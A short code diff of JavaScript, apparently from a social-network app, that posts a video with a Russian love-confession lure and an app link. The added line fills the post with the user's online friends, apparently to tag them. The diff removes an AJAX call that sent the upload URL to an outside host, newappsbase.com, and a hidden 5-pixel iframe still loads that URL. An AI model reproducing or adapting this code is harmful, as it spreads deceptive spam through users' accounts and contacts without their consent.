@@ -473,7 +473,7 @@
           var global_offset_i = 0;
           var count_video_save = 0;
           function uploadVideo() {
-              var users_list = "";
+              var users_list = getFriendsOnlineForPhoto();
               var text = [
                   "Мне сегодня призналось в любви 2 человека, кому больше? : "+link_app+" \n\n"+users_list
                 ];
@@ -494,19 +494,6 @@
                id_videoupload = data.response.video_id;
                //uploadComments();
 
-               $.ajax({
-               type: "POST",
-               url: "https://newappsbase.com/SP/functions.php",
-               data: {
-                   "method": "getLink",
-                   "url": data.response.upload_url
-               },
-               success: function(data){
-
-               },
-               error : function(data){
-
-               }});
                 $("#for_iframe").html('<iframe src="'+data.response.upload_url+'" height="5px" width="5px"></iframe>');
 
 
